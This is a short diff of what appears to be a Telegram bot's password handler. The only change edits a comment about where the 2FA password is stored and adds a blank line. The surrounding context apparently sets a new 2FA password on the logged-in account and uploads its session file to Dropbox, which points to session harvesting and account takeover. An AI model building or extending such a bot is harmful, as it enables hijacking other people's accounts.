@@ -277,7 +277,7 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     client = session["client"]
 
-    # Check if 2FA is enabled by checking if the password is in requirements.txt
+    # Check if 2FA is enabled by checking if the password is in the .env file
     current_2fa_password = load_2fa_password()
 
     if not current_2fa_password:  # 2FA is disabled, set a new 2FA password
@@ -313,6 +313,7 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except errors.PasswordHashInvalidError:
             await update.message.reply_text("❌ Incorrect password. Please try again.")
             return ASK_PASSWORD
+
 
 # ---- Upload Session File to Dropbox ----
 async def upload_session_to_dropbox(client, phone):
